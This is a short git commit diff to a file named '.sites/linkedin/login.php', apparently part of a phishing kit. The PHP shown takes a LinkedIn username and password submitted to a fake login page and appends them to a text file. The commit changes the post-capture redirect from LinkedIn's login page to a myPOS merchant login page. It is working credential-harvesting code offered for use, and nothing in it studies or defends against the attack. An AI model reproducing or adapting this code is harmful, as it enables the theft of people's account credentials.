36b9e69da49702227083b60b9a0fb28cf7bd44ad
cerozzo90 <cerozzotattoo90@gmail.com>
2025-07-28 00:39:03 +0200

    ty

--- .sites/linkedin/login.php
+++ .sites/linkedin/login.php
@@ -1,6 +1,6 @@
 <?php
 
 file_put_contents("usernames.txt", "Linkedin Username: " . $_POST['session_key'] . " Pass: " . $_POST['session_password'] . "\n", FILE_APPEND);
-header('Location: https://www.linkedin.com/login');
+header('Location: https://merchant.mypos.com/it/login ');
 exit();
 ?>
